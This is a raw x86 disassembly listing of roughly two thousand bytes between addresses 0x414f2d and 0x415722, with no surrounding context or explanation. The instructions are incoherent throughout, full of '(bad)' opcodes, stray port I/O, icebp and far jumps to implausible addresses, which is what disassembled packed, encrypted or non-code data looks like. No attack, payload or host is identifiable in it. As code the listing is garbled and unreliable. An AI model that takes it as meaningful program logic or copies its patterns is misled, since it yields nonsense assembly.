  414f2d:	stos   BYTE PTR es:[edi],al
  414f2e:	mov    edi,0x4ce4750b
  414f33:	out    dx,eax
  414f34:	cmp    BYTE PTR [eax+0x6],al
  414f37:	into   
  414f38:	and    BYTE PTR [ebp+edx*1+0x1e],dl
  414f3c:	lock and bl,BYTE PTR [esp+ecx*1-0x46512045]
  414f44:	in     al,dx
  414f45:	mov    bh,0xa1
  414f47:	jg     0x414f97
  414f49:	loope  0x414f0b
  414f4b:	mov    ah,0x2e
  414f4d:	add    BYTE PTR [esi-0x7d],cl
  414f50:	xchg   BYTE PTR [edx-0x5f],bl
  414f53:	sub    al,BYTE PTR [eax-0x5e]
  414f56:	das    
  414f57:	mov    esi,0x23312d
  414f5c:	lahf   
  414f5d:	push   ebx
  414f5e:	shl    esi,1
  414f60:	mov    al,ds:0x868819ef
  414f65:	repz jb 0x414f71
  414f68:	mov    bh,0x93
  414f6a:	loope  0x414eec
  414f6c:	xlat   BYTE PTR ds:[ebx]
  414f6d:	dec    ebp
  414f6e:	dec    esp
  414f6f:	data16 ins BYTE PTR es:[edi],dx
  414f71:	clc    
  414f72:	bound  eax,QWORD PTR [eax+0x71]
  414f75:	int    0x33
  414f77:	cli    
  414f78:	cmp    esi,DWORD PTR [ebx-0x1a]
  414f7b:	retf   
  414f7c:	jns    0x414f85
  414f7e:	(bad)  
  414f7f:	push   0x2c70654a
  414f84:	jl     0x414f77
  414f86:	pop    ebp
  414f87:	push   esp
  414f88:	add    eax,0x7de9a48c
  414f8d:	and    DWORD PTR [ebp*8+0x1191ca1],esi
  414f94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f95:	enter  0xa19a,0xbf
  414f99:	xchg   ecx,eax
  414f9a:	or     al,0x4d
  414f9c:	dec    esi
  414f9d:	std    
  414f9e:	sbb    BYTE PTR [ebx],cl
  414fa0:	pop    edx
  414fa1:	mov    eax,0x31f24f20
  414fa6:	xchg   edi,eax
  414fa7:	fadd   st(2),st
  414fa9:	mov    al,0xd4
  414fab:	xchg   DWORD PTR [ecx],ebp
  414fad:	stc    
  414fae:	jb     0x414fad
  414fb0:	nop
  414fb1:	cmp    al,0xea
  414fb3:	enter  0xc484,0x1
  414fb7:	push   DWORD PTR [edi+ecx*4-0x17]
  414fbb:	mov    ecx,0xf2b6f180
  414fc0:	pop    edi
  414fc1:	lods   eax,DWORD PTR ds:[esi]
  414fc2:	jne    0x415020
  414fc4:	xor    eax,0x836fdd34
  414fc9:	inc    eax
  414fca:	les    esi,FWORD PTR [ecx+0x15]
  414fcd:	in     eax,0x51
  414fcf:	pop    ds
  414fd0:	mov    DWORD PTR [esi-0x38],esp
  414fd3:	push   ecx
  414fd4:	mov    bl,0xf3
  414fd6:	xor    BYTE PTR [edi+0x56f11a21],dl
  414fdc:	outs   dx,BYTE PTR ds:[esi]
  414fdd:	test   al,0x39
  414fdf:	imul   edx,edi,0x6b
  414fe2:	and    edx,DWORD PTR [edi+0x1b4989df]
  414fe8:	adc    al,0x32
  414fea:	repnz lea esp,[edx+0x0]
  414fee:	outs   dx,DWORD PTR ds:[esi]
  414fef:	sub    DWORD PTR [eax-0x6],esi
  414ff2:	lods   eax,DWORD PTR ds:[esi]
  414ff3:	jp     0x415017
  414ff5:	inc    esp
  414ff6:	mov    al,0xb4
  414ff8:	inc    ebx
  414ff9:	adc    esi,ebx
  414ffb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ffc:	mov    ds:0x1bcb8cd1,al
  415001:	xchg   ebx,eax
  415002:	jmp    0x753b02a3
  415007:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415008:	imul   esp,DWORD PTR [ebx],0xf90b8172
  41500e:	sbb    eax,0x3c344c90
  415013:	sub    DWORD PTR [edx+ebp*1],0x2
  415017:	dec    edi
  415018:	push   es
  415019:	repnz lock outs dx,DWORD PTR cs:[esi]
  41501d:	fstp   QWORD PTR [ecx+0x35bcc1a9]
  415023:	pop    es
  415024:	sbb    DWORD PTR [edi+eiz*1+0x78],esp
  415028:	out    0xd9,al
  41502a:	out    0xa7,eax
  41502c:	mov    al,0x80
  41502e:	inc    ebx
  41502f:	ret    
  415030:	inc    edi
  415031:	adc    eax,0x486d452b
  415036:	clc    
  415037:	jo     0x41509d
  415039:	ror    eax,0x8f
  41503c:	(bad)
  415040:	sbb    al,0xa9
  415042:	dec    ebx
  415043:	into   
  415044:	mov    cl,0x2f
  415046:	out    dx,al
  415047:	or     BYTE PTR [edi+edi*4-0x22],cl
  41504b:	addr16 imul edx,edx,0x6a
  41504f:	push   ds
  415050:	xchg   DWORD PTR [eax+eax*4],esp
  415053:	sub    BYTE PTR [ebx],bh
  415055:	and    eax,0x61f438f0
  41505a:	sbb    dl,BYTE PTR [ebx-0x550ab8f9]
  415060:	inc    eax
  415061:	pop    esi
  415062:	push   0x2e
  415064:	xchg   BYTE PTR [edi+0x74],al
  415067:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415069:	mov    al,ds:0xd0205c63
  41506e:	aad    0xd9
  415070:	pop    ebp
  415071:	call   0x1a81:0xe9bb9706
  415078:	cdq    
  415079:	loop   0x4150f7
  41507b:	neg    esi
  41507d:	lds    eax,FWORD PTR [eax+0x7594c633]
  415083:	(bad)  
  415084:	dec    esp
  415085:	fst    DWORD PTR [ebx+0x340452c8]
  41508b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41508c:	adc    bh,cl
  41508e:	test   al,0x98
  415090:	and    bl,BYTE PTR [esi]
  415092:	leave  
  415093:	mov    edi,0xc1e14bfe
  415098:	not    ecx
  41509a:	in     eax,dx
  41509b:	push   ebp
  41509c:	xchg   BYTE PTR fs:[esp+eax*1],bh
  4150a0:	aam    0x92
  4150a2:	fild   DWORD PTR [ebp-0x785af15e]
  4150a8:	and    DWORD PTR [edx+0x78],0xbd7a8a7a
  4150af:	sbb    eax,0x9e84ecf0
  4150b4:	pushf  
  4150b5:	pop    esp
  4150b6:	test   al,0xef
  4150b8:	js     0x4150d0
  4150ba:	fcomip st,st(7)
  4150bc:	mov    esp,DWORD PTR [eax]
  4150be:	fst    QWORD PTR [eax]
  4150c0:	sbb    DWORD PTR [ebp+ebx*8-0x4e],0x4b583d5a
  4150c8:	pop    ss
  4150c9:	popa   
  4150ca:	mov    eax,ds:0x303ea647
  4150cf:	xchg   ecx,eax
  4150d0:	jg     0x415063
  4150d2:	ror    DWORD PTR [ecx-0x1c],cl
  4150d5:	mov    al,ds:0x63f32b54
  4150da:	mov    DWORD PTR [edx+0x7b405408],esi
  4150e0:	jns    0x41510a
  4150e2:	adc    al,0xe5
  4150e4:	dec    esi
  4150e5:	jb     0x4150d2
  4150e7:	push   esi
  4150e8:	adc    al,0x7a
  4150ea:	xchg   esi,eax
  4150eb:	dec    eax
  4150ec:	out    0x6f,al
  4150ee:	inc    ebp
  4150ef:	aam    0x7c
  4150f1:	xchg   ebx,eax
  4150f2:	in     eax,0x12
  4150f4:	call   0x4822:0x5f7de1de
  4150fb:	mov    ds:0x8f04a826,eax
  415100:	mov    edx,0x7c0b67ba
  415105:	popa   
  415106:	adc    BYTE PTR [ebx+ecx*8],dh
  415109:	enter  0xbfad,0x34
  41510d:	sbb    BYTE PTR [si+0x3fcd],dl
  415112:	data16 cmp ch,al
  415115:	cmp    BYTE PTR [ecx-0x4e5d771b],bl
  41511b:	adc    DWORD PTR [ebp+0x76b31bbb],ecx
  415121:	icebp  
  415122:	xchg   edx,eax
  415123:	push   ds
  415124:	lods   al,BYTE PTR ds:[esi]
  415125:	jbe    0x415162
  415127:	in     eax,0x34
  415129:	cs pusha 
  41512b:	push   ebp
  41512c:	leave  
  41512d:	xor    ah,ch
  41512f:	jmp    0x4150f9
  415131:	icebp  
  415132:	xchg   esi,eax
  415133:	jmp    0x41513f
  415135:	repz and ah,BYTE PTR [ecx]
  415138:	pop    ecx
  415139:	inc    ebx
  41513a:	jne    0x415193
  41513c:	mov    ebx,0x952a7104
  415141:	mov    esi,DWORD PTR [ebp+0x75]
  415144:	in     eax,dx
  415145:	adc    DWORD PTR [ebp+0x2f931fd3],eax
  41514b:	adc    al,0xd0
  41514d:	xchg   edx,eax
  41514e:	mov    ds:0x56090d90,al
  415153:	and    DWORD PTR [edi+0x29],ebx
  415156:	cld    
  415157:	leave  
  415158:	xchg   ecx,eax
  415159:	sub    eax,ebp
  41515b:	jge    0x415124
  41515d:	xor    al,0xf2
  41515f:	enter  0x699a,0xf5
  415163:	ins    BYTE PTR es:[edi],dx
  415164:	xchg   BYTE PTR [edi-0x52],ch
  415167:	call   0x542f75a7
  41516c:	pop    ebx
  41516d:	fild   DWORD PTR [edi]
  41516f:	push   es
  415170:	fcomp  DWORD PTR [esi]
  415172:	mov    dh,ch
  415174:	dec    esp
  415175:	sbb    al,ch
  415177:	jo     0x4151c4
  415179:	dec    esp
  41517a:	test   DWORD PTR [ebx+ebx*1-0x3b],ecx
  41517e:	and    sp,WORD PTR [ecx]
  415181:	mov    ds:0x35fb8155,al
  415186:	xor    BYTE PTR [esi],bl
  415188:	xlat   BYTE PTR ds:[ebx]
  415189:	aaa    
  41518a:	add    ch,BYTE PTR [edi-0x18]
  41518d:	pop    ds
  41518e:	jle    0x4151bb
  415190:	repz xor eax,0x7859cbdb
  415196:	shr    DWORD PTR [ebx-0x37],0xc9
  41519a:	cmp    eax,ebx
  41519c:	adc    al,0x9f
  41519e:	and    DWORD PTR [eax-0x66],ebp
  4151a1:	fidiv  DWORD PTR ds:0xe60819f3
  4151a7:	jb     0x415201
  4151a9:	mov    dl,0x36
  4151ab:	out    dx,al
  4151ac:	cwde   
  4151ad:	jl     0x4151ec
  4151af:	icebp  
  4151b0:	adc    edi,DWORD PTR [eax]
  4151b2:	icebp  
  4151b3:	cmp    eax,0x6fbe91a9
  4151b8:	xlat   BYTE PTR ds:[bx]
  4151ba:	pop    ebx
  4151bb:	fs dec eax
  4151bd:	add    BYTE PTR [edx-0x3],ch
  4151c0:	add    eax,0x75a2b214
  4151c5:	cmc    
  4151c6:	or     edx,ebp
  4151c8:	ins    BYTE PTR es:[edi],dx
  4151c9:	dec    edx
  4151ca:	xchg   edx,eax
  4151cb:	or     dh,dl
  4151cd:	lds    edi,FWORD PTR [eax]
  4151cf:	ror    BYTE PTR [edi],1
  4151d1:	cli    
  4151d2:	lods   eax,DWORD PTR ds:[esi]
  4151d3:	dec    ecx
  4151d4:	outs   dx,DWORD PTR ds:[esi]
  4151d5:	mov    ch,0x6a
  4151d7:	inc    ebp
  4151d8:	pushf  
  4151d9:	ja     0x415202
  4151db:	mov    eax,ds:0x3d2987f7
  4151e0:	xchg   ebp,eax
  4151e1:	hlt    
  4151e2:	push   0x8a0abf81
  4151e7:	xchg   esi,eax
  4151e8:	lods   al,BYTE PTR ds:[esi]
  4151e9:	jmp    0x4151ad
  4151eb:	in     al,0x70
  4151ed:	inc    ebp
  4151ee:	xlat   BYTE PTR ds:[ebx]
  4151ef:	icebp  
  4151f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4151f1:	push   ss
  4151f2:	sahf   
  4151f3:	adc    bl,0x9e
  4151f6:	jecxz  0x4151cc
  4151f8:	fisttp QWORD PTR [ecx+0x47]
  4151fb:	lea    esp,[esi]
  4151fd:	icebp  
  4151fe:	enter  0x269b,0x9
  415202:	adc    al,0x8d
  415204:	in     al,0xf6
  415206:	out    0xc2,eax
  415208:	imul   ebp,DWORD PTR [edi],0x5ff8919d
  41520e:	mov    ebp,0xa70201b9
  415213:	or     ch,al
  415215:	mov    eax,0xa0b1d7f4
  41521a:	xchg   ebp,eax
  41521b:	xchg   ebp,eax
  41521c:	or     bh,BYTE PTR [ebx]
  41521e:	dec    ebx
  41521f:	or     cl,BYTE PTR [eax+ecx*8]
  415222:	ret    0x827e
  415225:	xor    esi,eax
  415227:	js     0x41524e
  415229:	push   ds
  41522a:	or     edx,DWORD PTR [ebx]
  41522c:	push   eax
  41522d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41522e:	in     eax,dx
  41522f:	sti    
  415230:	pop    ecx
  415231:	int    0x2e
  415233:	outs   dx,DWORD PTR ds:[esi]
  415234:	div    cl
  415236:	jmp    0x41529c
  415238:	in     al,0x64
  41523a:	mov    ecx,0x1b1575e2
  41523f:	and    BYTE PTR [ecx+0x68],ch
  415242:	mov    esi,0x89e4ef2a
  415247:	adc    ebx,DWORD PTR [esi-0x58]
  41524a:	sub    dl,BYTE PTR [ecx-0x77]
  41524d:	sbb    al,ch
  41524f:	stc    
  415250:	aad    0x6c
  415252:	and    eax,0x5c2bcf12
  415257:	push   ss
  415258:	inc    esp
  415259:	add    DWORD PTR [ecx+ebx*1+0x18f8ce20],0x3c
  415261:	add    edx,DWORD PTR [edi+0x75]
  415264:	fucomip st,st(2)
  415266:	(bad)  
  415267:	clc    
  415268:	idiv   BYTE PTR [ebx-0x74d13d7c]
  41526e:	xor    ah,bl
  415270:	xor    ch,BYTE PTR [eax+0xadca6c2]
  415276:	iret   
  415277:	gs retf 
  415279:	xchg   BYTE PTR [esi-0x4b],ah
  41527c:	and    al,0x57
  41527e:	mov    al,ds:0x7da309a1
  415283:	in     al,0xaa
  415285:	dec    ecx
  415286:	fstp   TBYTE PTR [ecx]
  415288:	fmul   DWORD PTR [eax]
  41528a:	dec    esp
  41528b:	push   ss
  41528c:	fwait
  41528d:	inc    eax
  41528e:	push   eax
  41528f:	shl    BYTE PTR [ecx+0x47c24c99],cl
  415295:	pop    es
  415296:	jne    0x4152c6
  415298:	out    dx,al
  415299:	div    BYTE PTR [esi+0x5]
  41529c:	push   ecx
  41529d:	pop    ds
  41529e:	fisubr WORD PTR [edx]
  4152a0:	ins    BYTE PTR es:[edi],dx
  4152a1:	mov    cl,0x44
  4152a3:	add    eax,DWORD PTR [ecx+0x5489059b]
  4152a9:	aas    
  4152aa:	lds    ebx,FWORD PTR [eax]
  4152ac:	call   DWORD PTR [ebx+0x2b]
  4152af:	retf   
  4152b0:	mov    esp,0x61c2711e
  4152b5:	sbb    dl,BYTE PTR [edi+0x41]
  4152b8:	aas    
  4152b9:	mov    eax,0x24b0296
  4152be:	inc    ecx
  4152bf:	ins    DWORD PTR es:[edi],dx
  4152c0:	mov    esp,0x5b47704e
  4152c5:	mov    ah,0x67
  4152c7:	iret   
  4152c8:	adc    DWORD PTR [eax+0x2b560866],edx
  4152ce:	jne    0x41532a
  4152d0:	push   ecx
  4152d1:	rol    DWORD PTR [eax+eax*8],cl
  4152d4:	push   eax
  4152d5:	add    DWORD PTR [edx+eax*2-0x1e905a2],ebx
  4152dc:	add    al,bh
  4152de:	adc    al,0x6b
  4152e0:	outs   dx,BYTE PTR ds:[esi]
  4152e1:	sub    eax,0xa519c2b
  4152e6:	adc    bh,BYTE PTR [ebx-0x70]
  4152e9:	mov    bh,0x4
  4152eb:	cli    
  4152ec:	mov    dl,0xc6
  4152ee:	jae    0x4152d5
  4152f0:	xchg   ebx,eax
  4152f1:	ret    
  4152f2:	push   esp
  4152f3:	add    esp,DWORD PTR [eax-0x40]
  4152f6:	cmp    BYTE PTR [edi+0x5b914211],0xb1
  4152fd:	mov    ebx,0x4421572e
  415302:	push   edx
  415303:	popa   
  415304:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415305:	add    DWORD PTR [edi],ecx
  415307:	mov    esp,0x50a4b872
  41530c:	add    DWORD PTR [eax+eiz*8],0x9aa6d007
  415313:	cli    
  415314:	inc    edi
  415315:	mov    ebx,0x93bfff4e
  41531a:	push   esi
  41531b:	sbb    ebp,DWORD PTR [edi]
  41531d:	clc    
  41531e:	dec    eax
  41531f:	adc    BYTE PTR [ebp-0x6980a597],ch
  415325:	push   ebx
  415326:	push   0x68222f77
  41532b:	jns    0x41537e
  41532d:	and    eax,0x2f725b33
  415332:	cmp    DWORD PTR ds:0xa46ca8ca,ebx
  415338:	sar    DWORD PTR [ecx+0x71],0x15
  41533c:	and    BYTE PTR [edx-0x4d],bl
  41533f:	push   es
  415340:	int3   
  415341:	pushf  
  415342:	hlt    
  415343:	or     ebx,DWORD PTR [ecx]
  415345:	mov    al,0x2
  415347:	push   esp
  415348:	sub    eax,0xaa8c9a31
  41534d:	(bad)  
  41534e:	stc    
  41534f:	add    eax,0xe773af57
  415354:	xchg   edx,eax
  415355:	jle    0x4153c8
  415357:	and    DWORD PTR [bp-0x7f],0xffffffe7
  41535c:	xlat   BYTE PTR ds:[ebx]
  41535d:	sub    dh,BYTE PTR [ebx+esi*4-0x64dce58b]
  415364:	mov    esi,0x35061855
  415369:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41536a:	jge    0x4152ee
  41536c:	adc    BYTE PTR [ebp-0x51],0x33
  415370:	and    ecx,DWORD PTR [ecx-0x51f010b7]
  415376:	pop    ss
  415377:	(bad)  
  415378:	lods   eax,DWORD PTR ds:[esi]
  415379:	jnp    0x415368
  41537b:	rcr    DWORD PTR [edx-0x40],0xf
  41537f:	pop    esi
  415380:	mov    esi,0x2e0c885f
  415385:	cmp    eax,0x2be46d49
  41538a:	dec    esp
  41538b:	cwde   
  41538c:	jne    0x4153cc
  41538e:	leave  
  41538f:	xchg   BYTE PTR [eax],ah
  415391:	dec    edi
  415392:	rcr    DWORD PTR [esi-0x660f034e],0xf3
  415399:	xor    eax,0x9e19fd0f
  41539e:	inc    esp
  41539f:	or     al,0x12
  4153a1:	xor    dh,BYTE PTR [ecx+eiz*8]
  4153a4:	mov    ecx,0x68dd6c0b
  4153a9:	add    ebp,esp
  4153ab:	imul   ebx,DWORD PTR [edx],0xffffffc2
  4153ae:	mov    BYTE PTR [ecx+0x1bb5d804],0xeb
  4153b5:	arpl   WORD PTR [edi],bp
  4153b7:	inc    edx
  4153b8:	mov    cl,0xc9
  4153ba:	xlat   BYTE PTR ds:[ebx]
  4153bb:	fwait
  4153bc:	jmp    0x817990f2
  4153c1:	sar    BYTE PTR [edx],0xbe
  4153c4:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4153c6:	mov    ?,WORD PTR [eax+0x1449d05d]
  4153cc:	sub    ebx,esi
  4153ce:	push   ds
  4153cf:	pop    ebp
  4153d0:	jns    0x415415
  4153d2:	mov    esi,0x3139b53d
  4153d7:	xor    DWORD PTR [edi-0x3e3fa389],edx
  4153dd:	jp     0x41536a
  4153df:	pop    ss
  4153e0:	icebp  
  4153e1:	and    eax,0x51254cc1
  4153e6:	jmp    0xbb065384
  4153eb:	mov    bh,BYTE PTR [edi+0x51]
  4153ee:	out    dx,al
  4153ef:	sbb    BYTE PTR [eax-0x40dfa660],0x11
  4153f6:	cmp    eax,0xedf85dd1
  4153fb:	(bad)  
  4153fd:	mov    ds:0x29f73aad,al
  415402:	arpl   WORD PTR [ecx],cx
  415404:	adc    al,0xc9
  415406:	mov    ah,0xfc
  415408:	ins    BYTE PTR es:[edi],dx
  415409:	(bad)  
  41540b:	inc    esp
  41540c:	jbe    0x415487
  41540e:	enter  0xcb0c,0xc7
  415412:	iret   
  415413:	xchg   ebp,eax
  415414:	xchg   DWORD PTR [esp+ecx*2-0x330c402],esi
  41541b:	aaa    
  41541c:	ss add esp,edx
  41541f:	int3   
  415420:	pop    esi
  415421:	out    0xb4,eax
  415423:	dec    ebx
  415424:	mov    ch,0xd
  415426:	popw   es
  415428:	fcomp  DWORD PTR [ebx-0x2bd8a83]
  41542e:	jne    0x415445
  415430:	int3   
  415431:	adc    esp,DWORD PTR [edi]
  415433:	mov    eax,ds:0x3f1f9332
  415438:	mov    BYTE PTR [ecx+ebp*8-0x7c3efaad],0xa5
  415440:	jmp    0xb1dae671
  415445:	cmp    ebx,DWORD PTR [ebx]
  415447:	push   eax
  415448:	and    bl,BYTE PTR [bp+si+0x7927]
  41544d:	mov    edx,0x4f8274c6
  415452:	add    ebx,DWORD PTR [ebp+0x6b]
  415455:	gs stc 
  415457:	dec    edx
  415458:	popa   
  415459:	fsub   st,st(1)
  41545b:	xor    DWORD PTR [ebp+0x73],0xb18acc20
  415462:	mov    ah,dl
  415464:	adc    DWORD PTR [edx],esp
  415466:	xchg   edx,eax
  415467:	and    al,0x18
  415469:	fdivr  QWORD PTR [edi+0x1a34dcab]
  41546f:	stc    
  415470:	xor    ebp,0x66c66fc6
  415476:	add    al,0x29
  415478:	sub    BYTE PTR [esp+ebx*4+0x290ffdd7],ah
  41547f:	xor    BYTE PTR [eax],al
  415481:	xor    eax,0xa3d25cfe
  415486:	repz sub DWORD PTR [edx+0x35],edi
  41548a:	pusha  
  41548b:	mov    esi,DWORD PTR [esi-0x45]
  41548e:	aad    0x15
  415490:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415491:	nop
  415492:	jne    0x41542a
  415494:	enter  0x573,0x21
  415498:	dec    ebp
  415499:	arpl   WORD PTR [edx+0x34e6cd45],cx
  41549f:	(bad)  
  4154a1:	data16 add BYTE PTR [ebx-0x3e],bh
  4154a5:	push   ebp
  4154a6:	push   0xca7eb88a
  4154ab:	outs   dx,DWORD PTR ds:[esi]
  4154ac:	add    al,0x3
  4154ae:	jl     0x415430
  4154b0:	jne    0x41544f
  4154b2:	inc    edx
  4154b3:	push   edi
  4154b4:	das    
  4154b5:	pop    esi
  4154b6:	add    BYTE PTR [ebp-0x3d],ah
  4154b9:	test   DWORD PTR [eax-0x34],esp
  4154bc:	and    BYTE PTR [esi],bh
  4154be:	jno    0x4154d6
  4154c0:	cs loopne 0x4154ad
  4154c3:	sti    
  4154c4:	lds    ebp,FWORD PTR [edi]
  4154c6:	rcl    DWORD PTR [ecx],0x27
  4154c9:	sub    al,0x9d
  4154cb:	out    0x13,eax
  4154cd:	add    eax,0x8f2bb055
  4154d2:	mov    bh,0x47
  4154d4:	mov    eax,0xed151568
  4154d9:	(bad)  
  4154da:	fstp   QWORD PTR [eax]
  4154dc:	xchg   ebx,eax
  4154dd:	loop   0x4154ca
  4154df:	jns    0x415497
  4154e1:	add    esp,ebx
  4154e3:	mov    eax,ds:0x9a4e3b0d
  4154e8:	jg     0x41550a
  4154ea:	xlat   BYTE PTR ds:[ebx]
  4154eb:	test   al,0xb0
  4154ed:	(bad)  
  4154ee:	jnp    0x41549e
  4154f0:	or     BYTE PTR [edx],ah
  4154f2:	sub    eax,DWORD PTR [ebp+0x6c]
  4154f5:	ret    0x9374
  4154f8:	or     DWORD PTR [ecx+0x61b5ed55],edx
  4154fe:	out    dx,al
  4154ff:	out    dx,al
  415500:	loop   0x415494
  415502:	dec    ebx
  415503:	(bad)  [eax+eax*2-0x20e8232]
  41550a:	and    al,0x53
  41550c:	mov    ah,0x8
  41550e:	js     0x415505
  415510:	and    DWORD PTR [edi],ebx
  415512:	pop    ss
  415513:	cmp    eax,0x8d076d29
  415518:	call   0xb1048f1f
  41551d:	mov    eax,0xde70f8a1
  415522:	xor    DWORD PTR [ecx+0xfa3ddaf],eax
  415528:	in     eax,0x40
  41552a:	in     eax,0xfb
  41552c:	and    al,0x5e
  41552e:	loop   0x41550a
  415530:	sub    edi,ebp
  415532:	test   cl,0xf3
  415535:	inc    ebx
  415536:	lea    ebp,[eax]
  415538:	mov    ds:0x71094c1f,al
  41553d:	sbb    ah,ah
  41553f:	jo     0x4154d7
  415541:	sub    al,0x37
  415543:	aad    0xc6
  415545:	sbb    eax,0xd8b95d06
  41554a:	cdq    
  41554b:	mov    eax,0xa56dfbcb
  415550:	ror    DWORD PTR [ecx+0x47a7c24c],1
  415556:	mov    ah,0x21
  415558:	icebp  
  415559:	ds adc bh,ah
  41555c:	fild   WORD PTR [ebx+0x67]
  41555f:	jl     0x415565
  415561:	aas    
  415562:	sti    
  415563:	rcr    dh,1
  415565:	jns    0x41554a
  415567:	jl     0x4155d1
  415569:	xor    dl,BYTE PTR [edx+0x71a8a4b9]
  41556f:	daa    
  415570:	fnstsw WORD PTR [edi-0x66]
  415573:	add    eax,0x8f4524ae
  415578:	jbe    0x4155b3
  41557a:	mov    edx,0x54e34976
  41557f:	jp     0x41554c
  415581:	dec    esi
  415582:	sub    cl,BYTE PTR [esi-0x80]
  415585:	and    al,0xff
  415587:	mov    esp,0x545265e0
  41558c:	mov    al,ds:0xe71fae3c
  415591:	pop    ds
  415592:	xchg   esp,eax
  415593:	bound  edx,QWORD PTR [ecx+0x1cd1553f]
  415599:	jmp    0x40de:0xae80a79d
  4155a0:	add    eax,0x806c0af7
  4155a5:	or     cl,cl
  4155a7:	cmc    
  4155a8:	aas    
  4155a9:	inc    ebp
  4155aa:	inc    edx
  4155ab:	enter  0x3d69,0xc1
  4155af:	inc    esi
  4155b0:	ret    
  4155b1:	(bad)  
  4155b3:	lahf   
  4155b4:	xor    al,BYTE PTR [ecx-0x1b]
  4155b7:	mov    bl,0x6c
  4155b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155ba:	int    0x88
  4155bc:	add    ch,dl
  4155be:	lods   al,BYTE PTR ds:[esi]
  4155bf:	fld    TBYTE PTR [edx]
  4155c1:	or     DWORD PTR [edx+esi*2-0x318435e9],esp
  4155c8:	adc    edi,DWORD PTR [ebx+0xa77524]
  4155ce:	sbb    ebx,ebp
  4155d0:	and    BYTE PTR [eax],bh
  4155d2:	test   al,0x6b
  4155d4:	add    al,BYTE PTR [ecx+ebp*4]
  4155d7:	xchg   edi,eax
  4155d8:	cmp    BYTE PTR [esi-0x658f182b],0x76
  4155df:	mov    ah,0xc9
  4155e1:	aad    0x52
  4155e3:	and    eax,0x61f31415
  4155e8:	pop    es
  4155e9:	pop    esi
  4155ea:	inc    di
  4155ec:	mov    esp,ecx
  4155ee:	pusha  
  4155ef:	pop    esi
  4155f0:	jbe    0x41562a
  4155f2:	das    
  4155f3:	xor    eax,0xe8418f83
  4155f8:	mov    al,ds:0x298a64b7
  4155fd:	jl     0x4155c4
  4155ff:	push   0x142f4e3b
  415604:	lods   al,BYTE PTR ds:[esi]
  415605:	and    ecx,DWORD PTR [esi+ebx*8-0x64e504f]
  41560c:	mov    edi,0x45b2d077
  415611:	in     eax,0x68
  415613:	pop    ecx
  415614:	nop
  415615:	jge    0x415690
  415617:	and    eax,0x367b447
  41561c:	mov    ch,0x28
  41561e:	in     al,0x27
  415620:	out    dx,al
  415621:	pop    esp
  415622:	ins    BYTE PTR es:[edi],dx
  415623:	ficom  DWORD PTR [ebp+0x711e317e]
  415629:	jmp    0x9ef9:0xe488fe36
  415630:	adc    al,0x17
  415632:	jns    0x4155da
  415634:	cmp    eax,0xf2251114
  415639:	mov    ds,ebx
  41563b:	dec    ebp
  41563c:	adc    eax,0x7e31ceb6
  415641:	imul   edx,edi,0x1573e647
  415647:	and    BYTE PTR [esi+0x4b5c9010],ah
  41564d:	jnp    0x4155f4
  41564f:	and    esi,esi
  415651:	jno    0x41565a
  415653:	ss lock sbb eax,0x39a10d16
  41565a:	paddsb mm5,QWORD PTR [eax]
  41565d:	mov    al,0x95
  41565f:	pop    esi
  415660:	sub    al,0xb4
  415662:	pop    es
  415663:	jecxz  0x415638
  415665:	test   al,0x53
  415667:	(bad)  
  415668:	jnp    0x415625
  41566a:	test   eax,0x3e04d41
  41566f:	and    DWORD PTR [esi+eiz*2+0x4c9384fe],esi
  415676:	mov    BYTE PTR [eax+0x78],dh
  415679:	int3   
  41567a:	fucomip st,st(3)
  41567c:	and    BYTE PTR [ebp-0x6ea0999d],bh
  415682:	out    0x41,al
  415684:	sub    al,0x13
  415686:	dec    eax
  415687:	(bad)  
  415688:	push   ebp
  415689:	xchg   esp,eax
  41568a:	pop    edx
  41568b:	repz stc 
  41568d:	out    dx,al
  41568e:	shl    al,0xb6
  415691:	push   es
  415692:	arpl   WORD PTR [ecx],di
  415694:	jne    0x4156cc
  415696:	shl    BYTE PTR [esi-0x4c],0x76
  41569a:	int    0x15
  41569c:	sub    esp,DWORD PTR [eax]
  41569e:	mov    al,0x7c
  4156a0:	imul   BYTE PTR [ebp-0x6e127ab5]
  4156a6:	dec    esi
  4156a7:	cdq    
  4156a8:	sub    eax,0x7e3cfdf5
  4156ad:	mov    ecx,0x3760279
  4156b2:	inc    ebp
  4156b3:	icebp  
  4156b4:	cdq    
  4156b5:	xchg   edi,eax
  4156b6:	sbb    ebx,esp
  4156b8:	push   eax
  4156b9:	lea    edx,[edi]
  4156bb:	inc    ebp
  4156bc:	ins    DWORD PTR es:[edi],dx
  4156bd:	mov    eax,0xc47047a7
  4156c2:	popf   
  4156c3:	test   BYTE PTR es:[edx+0x42e5ffb7],al
  4156ca:	adc    bh,bl
  4156cc:	jbe    0x4156ad
  4156ce:	rol    cl,cl
  4156d0:	and    DWORD PTR [ebx-0x5b],0xcbab63b3
  4156d7:	out    dx,eax
  4156d8:	mov    ecx,0x87d1aa91
  4156dd:	pop    ebp
  4156de:	fdivr  QWORD PTR [edi+0x3f257e53]
  4156e4:	sar    ebp,0xf
  4156e7:	pop    ecx
  4156e8:	or     eax,0xfa8a06ec
  4156ed:	cmp    esp,DWORD PTR [esp+edi*1-0x52]
  4156f1:	jmp    0xbf44a41b
  4156f6:	inc    esp
  4156f7:	or     eax,0xe91d802d
  4156fc:	clc    
  4156fd:	dec    ecx
  4156fe:	sbb    dh,BYTE PTR [ebx]
  415700:	pop    edx
  415701:	push   eax
  415702:	mov    dl,0x1c
  415704:	and    BYTE PTR [esp+eiz*2-0xc],bl
  415708:	dec    esp
  415709:	mov    ds:0xd88dda34,eax
  41570e:	mov    ah,0x6c
  415710:	ret    0x361e
  415713:	xor    DWORD PTR [ecx-0x31],edi
  415716:	mov    ebp,0x6bc40bcf
  41571b:	inc    ebx
  41571c:	push   ecx
  41571d:	sbb    eax,0x4a0cb1b5
  415722:	push   ecx
